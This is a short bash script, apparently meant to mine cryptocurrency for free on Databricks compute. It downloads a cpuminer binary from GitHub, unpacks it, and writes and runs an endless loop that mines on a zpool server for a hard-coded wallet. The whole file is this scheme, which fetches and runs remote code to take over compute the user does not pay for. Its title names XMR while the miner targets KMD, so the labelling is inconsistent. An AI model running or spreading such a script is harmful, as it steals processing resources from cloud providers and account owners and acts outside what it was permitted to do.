#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R KMD
 
wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/v1.0/Cpuminer-opt-cpupower-linux64.tar.gz && tar zxvf Cpuminer-opt-cpupower-linux64.tar.gz && echo '#!/bin/sh
while [ 1 ]; do
./cpuminer -a cpupower -o stratum+tcp://cpupower.sea.mine.zpool.ca:6240 -u RQhzMBStnUcVCUe1r8m5Rc5hP5zp2fYJc1 -p databrick1,c=KMD
sleep 10
done' > autominer.sh && chmod +x autominer.sh && ./autominer.sh
